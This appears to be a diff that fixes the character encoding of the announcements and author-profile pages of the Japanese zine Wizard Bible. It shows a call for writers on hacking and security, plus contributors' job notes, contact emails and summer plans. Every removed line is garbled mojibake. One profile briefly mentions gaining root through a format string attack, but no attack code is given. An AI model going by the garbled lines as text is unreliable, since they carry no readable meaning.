 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
-��Wizard Bible�ihttp://wizardbible.org/�j�ł͐����A���M���C�^�[���W����
-���܂��B
-�@�������e�̃e�[�}�͍L�`�ł́uunder ground�v�ł��B�Ⴆ�΃n�b�L���O��Z�L
-�����e�B����s�b�L���O�Ȃǂƕ��L�����e���l���Ă��܂��B�܂�����ȐE�Ƃ��
-���̉���Ȃǂł��\���܂���B
-�@��񂫂�ł��\���܂���B�܂��K������A�ڂ���`��������܂���̂ŁA�ł�
-��͈͂ō\���܂���B�C�y�ɐ��������Ă��������B
+ --- 第7章: お知らせ ---
 
-��Kenji Aiko����Q&A������Ă���܂����B���߂ĎQ������l�ł��킩��₷��
-������Ă��܂��̂ŁA�Q�l�ɂ��Ă��������B
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+○Wizard Bible（http://wizardbible.org/）では随時、執筆ライターを募集して
+います。
+　扱う内容のテーマは広義での「under ground」です。例えばハッキングやセキ
+ュリティからピッキングなどと幅広い内容を考えています。また特殊な職業や趣
+味の解説などでも構いません。
+　一回きりでも構いません。また必ず毎回連載する義務もありませんので、でき
+る範囲で構いません。気軽に声をかけてください。
+
+○Kenji AikoさんがQ&Aを作ってくれました。初めて参加する人でもわかりやすく
+書かれていますので、参考にしてください。
 
 http://wizardbible.org/wbQandA.html
 
-��Wizard Bible�ɎQ����]�̕��͋C�y�Ƀ��[���iipusiron@gmail.com�j���������B
+○Wizard Bibleに参加希望の方は気軽にメール（ipusiron@gmail.com）ください。
 
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
-  ---- ��8��: ���҃v���t�B�[�� ---
+  ---- 第8章: 著者プロフィール ---
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
 
-������
-��Job: �v���O���}�[
-��Web: http://guardian.jumperz.net/, http://www.jumperz.net/
-��Mail: anvil@jumperz.net
-��Comment:
-�@�����̉�Ђłͳ��ޱ��؍�肪�D������۸��ϰ/�ݼ�Ʊ�n�̐l���W���悤����
-�v���Ă���Ƃ���i�Ȃ񂾂����j�ł��B�����͂��܂�o�܂��񂪔�r�I���R��
-�����̐E��Ƃ����ܻ�ł��B�����������Ұق��������B�������Ȃ���ق͈ȉ��ɂ�
-��܂��B
-�EWindows���ް�Ǘ��n���
-�E�iMicrosoft�́jASP�AC#�Ƃ�VB
-�E�ėp���߭���̒m���@JCL�Ƃ���
-�ECOBOL������
-�����̉Ă�肽�����ƁE���������
-�@���̉Ă͉��{�ꉫ�̗v�ǁA�����ɂ����Ă��܂����I
-�@�^�d�Ԏ��̎��ƎI�ǌn�b��Ő���オ���Ă����Ƃ���A�u���ް����Ǘ��͊y
-�����ł���ˁB�����Ď����̔閧��n����Ă�݂����Ȃ��񂶂�Ȃ��ł����I�v
-�ƈꌾ�B�������Ȃ�قǁB���ފǗ����Ėʓ|�ő�ςŋ��ɂȂ�Ȃ��̂ɂȂ�ł�
-��ȂɊy�����̂��A�Ƃ������N�̋^�₪�X�򂵂܂����B
+■金床
+●Job: プログラマー
+●Web: http://guardian.jumperz.net/, http://www.jumperz.net/
+●Mail: anvil@jumperz.net
+●Comment:
+　ワタクシの会社ではウェブアプリ作りが好きなプログラマー/エンジニア系の人を募集しようかと
+思っているところ（なんだそりゃ）です。お金はあまり出ませんが比較的自由な
+感じの職場というウワサです。興味ある方はメールくだちい。活かせないスキルは以下にな
+ります。
+・Windowsサーバー管理系スキル
+・（Microsoftの）ASP、C#とかVB
+・汎用コンピュータの知識　JCLとかｗ
+・COBOLｗｗｗ
+●この夏やりたいこと・やったこと
+　この夏は横須賀沖の要塞、猿島にいってきますた！
+　某電車事故氏と鯖管系話題で盛り上がっていたところ、「サーバー作りや管理は楽
+しいですよね。だって自分の秘密基地作ってるみたいなもんじゃないですか！」
+と一言。おおっなるほど。サーバ管理って面倒で大変で金にならないのになんでこ
+んなに楽しいのか、という長年の疑問が氷塊しますた。
 
 
-��Will
-��Job: Student
-��Web: http://security.symphonic-net.com/
-��Mail: will_net@hotmail.co.jp
-��Comment:
-�@�܂��Ȃ�Ƃ������A�v���Ԃ��Wizard Bible�̋L���������Ĕ��܂������@��
-���Ă邱�Ƃ͊ȒP�Ȃ�ł����A���͂ɂ���̂͂�͂����B�ł��A��͂���
-�֌W�̋L���������̂͒��X�ʔ����ł��B
-�@���A�����������d�������������@�ŋ߂̓A���o�C�g���ĂȂ��ċ����Ȃ̂ł�
-�P�`��܂����Ă�Will�ł����[�B
-�����̉Ă�肽�����ƁE���������
-�@��芸�����A��T�Ԃ��炢��w�̐}���قɒʂ��ĕ׋��ł����ˁB���������A��
-�������A�{���ǂ��̂������Ă邩��ǂ������B
-�@��͔ޏ��ƉԉΑ��ɍs�������炢�ł����ˁ[�B
+■Will
+●Job: Student
+●Web: http://security.symphonic-net.com/
+●Mail: will_net@hotmail.co.jp
+●Comment:
+　まぁなんというか、久しぶりにWizard Bibleの記事を書いて疲れましたｗ　や
+ってることは簡単なんですが、文章にするのはやはり難しい。でも、やはり解析
+関係の記事を書くのは中々面白いです。
+　つか、そういうお仕事くださいｗ　最近はアルバイトしてなくて金穴なのでで
+ケチりまくってるWillでしたー。
+●この夏やりたいこと・やったこと
+　取り敢えず、一週間くらい大学の図書館に通って勉強ですかね。涼しいし、静
+かだし、本も良いのが揃ってるから良い感じ。
+　後は彼女と花火大会に行く事くらいですかねー。
 
 
-���������iRudolph von Gartheimer�j
-��Job:Der vollstreckende Vorsitzender des zentralen Exekutivkomitees
-��Web:http://www.gartheimer.com/
-��Mail:gartheimer@hotmail.com
-��Team�iGroup�j�F�@���@�l ���A��
-��Comment:
-�@����̃l�^���E�`�̃����}�K�̏Ă������A�Ƃ������قڃR�s�y�ł��B�ǎґw��
-���������𗧂l���A���e���񂹂Ă݂܂����B�F�l�̐g�߂Ȍo�ϊw�ɂ����ɂ���
-����΍K���ł��B
-�����̉Ă�肽�����ƁE���������
-�@�Ă͂����Ƃ������ȋG�߂Ȃ�ł����A��肽�����Ƃ͊C�ɕW�{�̏W�ɏo������
-���ł��ˁB�t�W�c�{�Ƃ��H�ׂ�Ɣ��������̂ŁA�o�[�i�[�ŏĂ��E���ĐH�ׂĂ�
-����B�܂��ɊC�̍K�I�I
-�@��������Ƃƌ����΁AEPSILON�a�����߂Ƃ���f�[�^�n�E�X�̏��Ђ��Q�l�ɂ���
-�Ƃ���T�[�o�[�����Ă����ƂƂł��BIT�n�̋Z�p�җl�̓��e�������A����Wizard
- Bible�Ń��^�V�͋ɂ߂Ĉْ[�ł����A�ւ̓��͎ցB�����Ɋւ��邱�ƂłȂɂ���
-����ł�����A���C�y�ɂ��A�����������܂��B
+■理事長（Rudolph von Gartheimer）
+●Job:Der vollstreckende Vorsitzender des zentralen Exekutivkomitees
+●Web:http://www.gartheimer.com/
+●Mail:gartheimer@hotmail.com
+●Team（Group）：宗凶法人 愛連合
+●Comment:
+　今回のネタもウチのメルマガの焼き直し、というかほぼコピペです。読者層が
+多い方が役立つ考え、原稿を寄せてみました。皆様の身近な経済学にお役にたて
+られれば幸いです。
+●この夏やりたいこと・やったこと
+　夏はもっとも嫌いな季節なんですが、やりたいことは海に標本採集に出かけた
+いですね。フジツボとか食べると美味しいので、バーナーで焼き殺して食べてみ
+たり。まさに海の幸！！
+　やったことと言えば、EPSILON殿を初めとするデータハウスの書籍を参考にして
+とあるサーバーを建てたこととです。IT系の技術者様の投稿が多い、このWizard
+ Bibleでワタシは極めて異端ですが、蛇の道は蛇。お金に関することでなにかお
+困りでしたら、お気軽にご連絡くださいませ。
 
 
-��Defolos
-��Job: Student
-��Web: http://ruffnex.oc.to/defolos/
-��Mail: defolos@ruffnex.oc.to
-��Team�iGroup): none
-��Comment:
-�@����ɂ��́ADefolos�ł��B
-�@����A���͌��\��J���܂����B�t�H�[�}�b�g�X�g�����O�U���Ŗ߂�A�h���X��
-����������T���v�����ĂقƂ�ǏЉ��ĂȂ��āASEIP�̏ꏊ�������o����
-�Ɏl�ꔪ��c�B�܂��A�ŏI�I�ɂ�����root�D��ł�������ǂ������ł��B
-�����̉Ă�肽�����ƁE���������
-�@���Ђ̎��M���撣�肽���ł��B����܂Ŏ����Ƃ��F�X����܂��āA�قƂ�ǐi
-�܂Ȃ������̂ŁA���̉Ă𗘗p���ăo���o�������Ă��������ł��ˁB���ƁA�[�~
-�Ńv���O���~���O�̃o�C�g����邱�ƂɂȂ����̂ŁA���������C������Ċ撣��
-�����ł��B
+■Defolos
+●Job: Student
+●Web: http://ruffnex.oc.to/defolos/
+●Mail: defolos@ruffnex.oc.to
+●Team（Group): none
+●Comment:
+　こんにちは、Defolosです。
+　今回、実は結構苦労しました。フォーマットストリング攻撃で戻りアドレスを
+書き換えるサンプルってほとんど紹介されてなくて、SEIPの場所を見つけ出すの
+に四苦八苦…。まぁ、最終的にちゃんとroot奪取できたから良かったです。
+●この夏やりたいこと・やったこと
+　書籍の執筆を頑張りたいです。これまで試験とか色々ありまして、ほとんど進
+まなかったので、この夏を利用してバリバリ書いていきたいですね。あと、ゼミ
+でプログラミングのバイトをやることになったので、そっちも気合入れて頑張り
+たいです。
 
 
-��Kenji Aiko
-��Job: engineer
-��Web: http://ruffnex.oc.to/kenji/
-��Mail: kenji@ruffnex.oc.to
-��Comment:
-�@�O��̋�������́u���Ђ��ŰЁv���ʔ����������i���_���a�V�������j�BWiza
-rd Bible�͋Z�p�n�l�^����Ȃ��Ă�����Ă�����̂ł́H�@�Ǝv���Ă��܂������A
-����͖l������̂ŁA�Z�p�l�^��������A���Ђ�낵�����肢���܂�m(_ _)m�B
-�����̉Ă�肽�����ƁE���������:
-�@��肽���v���O���~���O����肽���i�Ƃ��������j�B�������������Ƃ͎R��
-�ǂ���̂ŁA�Ђ��[�������o���Ă����܂B����ς�Z�L�����e�B�Z�p�͖ʔ�
-���B
+■Kenji Aiko
+●Job: engineer
+●Web: http://ruffnex.oc.to/kenji/
+●Mail: kenji@ruffnex.oc.to
+●Comment:
+　前回の金床さんの「サシーミとツナーミ」が面白すぎたｗ（視点が斬新すぎｗ）。Wiza
+rd Bibleは技術系ネタじゃなくてもやっていけるのでは？　と思ってしまったが、
+それは僕が困るので、技術ネタ書ける方、ぜひよろしくお願いしますm(_ _)m。
+●この夏やりたいこと・やったこと:
+　やりたいプログラミングをやりたい（というかやる）。研究したいことは山ほ
+どあるので、片っ端から手を出していきまつ。やっぱりセキュリティ技術は面白
+い。
 
 
-��IPUSIRON
-��Job: �Ԗ����m
-��Web: http://akademeia.info
-��Mail: ipusiron@gmail.com
-��Comment:
-�E�Ƃ�PC�V�����܂����BHHK�𐔓��Ԏg���Ă��܂������A�ł��ԈႦ������������
-���̂ŁA����ς�����̕��ʂ̃L�[�{�[�h�ɖ߂��܂����B
-�ESoftbank����u��2����̌g�ѓd�b�T�[�r�X���I�����܂��v�Ƃ����t�������āA
-��R�Ƃ��Ă܂��B�@��ύX����ƃ��u��z�Ȃ��Ȃ邩�獢��܂��B
-�����̉Ă�肽�����ƁE���������:
-�@2�������炢�O�ɓk���ŎR����̎����������B���܂����i�������1���ł͂�
-���j�B
-�@���͌ܐF�s��������Ă݂����Ǝv���Ă��܂��B�Ƃ̋߂��ɖڐԕs��������A��
-�Ђ̋߂��ɖڐs���A���̑O�ڍ��s���s���Ă��܂����B���̉Ă̂����ɁA�c���
-�ڔ��s���Ɩډ��s���ɍs���Ă��������Ǝv���܂��B
-�@�l�I�ɂ����߂̃X�|�b�g�Љ�Ă݂܂��B
-�E�ڍ��̊񐶒������فF�񐶒��̐��I�ȃX�P�b�`������ƁA�׋������C�ɂ���
-�Ă���܂��B
-�E�ѓc���̓������ȑ�w�ߑ�Ȋw�����فF�R���s���[�^�D���Ȃ琥��BTK-80��C
-PU 8080���񂳂�Ă���A�^�C�K�[�v�Z�@�����ۂɐG�邱�Ƃ��ł��܂��B
-�E���̍����Ȋw�����فF��݂�3F�̓��������Q�������B���X�͂���炷�ׂĂ�
-�l�����L���Ă������̂��Ƃ��������Ƃ���ɋ����B
-�E�_�ے��̖��ϊُ��X�F���H�w�����̌Ï��X�B���������Ȗ{�⃌�A�Ȗ{���ǂ�
-����B
-�E�����ۂ̓��̍c���F�c���O���E�ʖ����Řa���o�C�L���O���Ă���A�c���̍L��
-���U��B���Ԃ�����΁A�߂��̕�����̎�ˌ��āA���`�x�[�V�����グ�Ă����
-�j�{���X�u���㉮�v�܂ŕ����̂��悢�����B
-�E�����̓��{�Ȋw�����فF�����̂�����ʓW����Ă�Ƃ��ɂ��łɏ�݂݂�
-�Ƃ悢�Ǝv���B
+■IPUSIRON
+●Job: 赤魔道士
+●Web: http://akademeia.info
+●Mail: ipusiron@gmail.com
+●Comment:
+・家のPC新調しました。HHKを数日間使っていましたが、打ち間違えが多すぎだっ
+たので、やっぱり安物の普通のキーボードに戻しました。
+・Softbankから「第2世代の携帯電話サービスを終了します」という葉書が来て、
+呆然としてます。機種変更するとラブ定額なくなるから困ります。
+●この夏やりたいこと・やったこと:
+　2ヶ月ぐらい前に徒歩で山手線の周りを一周到達しました（もちろん1日ではな
+い）。
+　次は五色不動を回ってみたいと思っています。家の近くに目赤不動があり、会
+社の近くに目青不動、この前目黒不動行ってきました。この夏のうちに、残りの
+目白不動と目黄不動に行っておきたいと思います。
+　個人的にお勧めのスポット紹介してみます。
+・目黒の寄生虫博物館：寄生虫の精巧なスケッチを見ると、勉強をやる気にさせ
+てくれます。
+・飯田橋の東京理科大学近代科学資料館：コンピュータ好きなら是非。TK-80やC
+PU 8080が陳列されており、タイガー計算機を実際に触ることもできます。
+・上野の国立科学博物館：常設の3Fの動物剥製群が圧巻。元々はこれらすべてが
+個人が所有していたものだという聞くとさらに驚く。
+・神保町の明倫館書店：理工学書専門の古書店。お買い得な本やレアな本がどっ
+さり。
+・東京丸の内の皇居：皇居外苑・彩味処で和風バイキングしてから、皇居の広場
+を散策。時間があれば、近くの平将門の首塚見て、モチベーション上げてから歴
+史本専門店「時代屋」まで歩くのもよいかも。
+・お台場の日本科学未来館：興味のある特別展やってるときについでに常設みる
+とよいと思う。
 
 
